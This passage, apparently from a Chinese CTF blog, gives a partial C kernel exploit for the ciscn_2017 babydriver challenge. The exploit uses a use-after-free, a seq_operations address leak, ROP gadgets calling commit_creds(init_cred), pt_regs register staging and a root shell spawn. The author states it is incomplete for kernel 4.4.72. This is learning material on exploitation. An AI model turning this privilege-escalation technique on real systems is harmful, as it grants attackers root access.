<p>本题目给的内核版本是 4.4.72，没有 KPTI 和 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数，因此没法完成演示</p>
<p>下面给出非完整的 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff81e48c60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>         seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>      pop_rdi_ret;</span><br><span class="line"><span class="keyword">size_t</span>      init_cred;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs;</span><br><span class="line"><span class="keyword">size_t</span>      add_rsp_offset_ret;</span><br><span class="line"><span class="keyword">size_t</span>      magic_addr;</span><br><span class="line"><span class="keyword">size_t</span>      mov_cr4_ret;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         fd[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">size_t</span>      leak_data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    saveReg();</span><br><span class="line"></span><br><span class="line">    fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[<span class="number">0</span>], <span class="number">0x10001</span>, <span class="number">0x20</span>);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    read(fd[<span class="number">1</span>], leak_data, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data dump %d: %p\n&quot;</span>, i, leak_data[i]);</span><br><span class="line"></span><br><span class="line">    kernel_offset = leak_data[<span class="number">0</span>] - <span class="number">0xffffffff8122f4d0</span>;</span><br><span class="line">    kernel_base = (<span class="keyword">void</span>*) ((<span class="keyword">size_t</span>)kernel_base + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel offset: %llx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0xffffffff810d238d</span> + kernel_offset; <span class="comment">/* pop rdi; ret; */</span></span><br><span class="line">    swapgs = <span class="number">0xffffffff81063694</span> + kernel_offset; <span class="comment">/* swapgs; pop rbp; ret; */</span></span><br><span class="line">    mov_cr4_ret = <span class="number">0xffffffff81004d80</span> + kernel_offset; <span class="comment">/* mov cr4, rdi; pop rbp; ret; */</span></span><br><span class="line"></span><br><span class="line">    magic_addr = kernel_offset + <span class="number">0xffffffff810d238d</span>; <span class="comment">/* 为了打断点而随便找的 */</span></span><br><span class="line">    add_rsp_offset_ret = kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic_addr: 0x%llx\n&quot;</span>, magic_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;magic_addr, <span class="number">8</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, add_rsp_offset_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span> </span><br><span class="line">        <span class="string">&quot;mov r12, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    getRootShell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>主要是参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/member.html?memberId=157910">墨晚鸢</a> 大佬的博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-2">在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法-安全客 - 安全资讯平台 (anquanke.com)</a> </li>
</ul>
<p>他给出的参考题目应该是改过内核版本的，我手上没有对应版本的题目，最后只能将就了</p>
<p>之后抽时间学一下 <code>ldt_struct</code> 的利用</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/pt-regs/" rel="tag"><i class="fa fa-tag"></i> pt_regs</a>
              <a href="/tags/seq-operations/" rel="tag"><i class="fa fa-tag"></i> seq_operations</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/" rel="prev" title="栈迁移+爆破">
      <i class="fa fa-chevron-left"></i> 栈迁移+爆破
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/26/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%AE%9E%E7%8E%B0%20Linux%20Sniffer/" rel="next" title="网络相关知识：实现 Linux Sniffer">
      网络相关知识：实现 Linux Sniffer <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">283</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">147</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">60:01</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
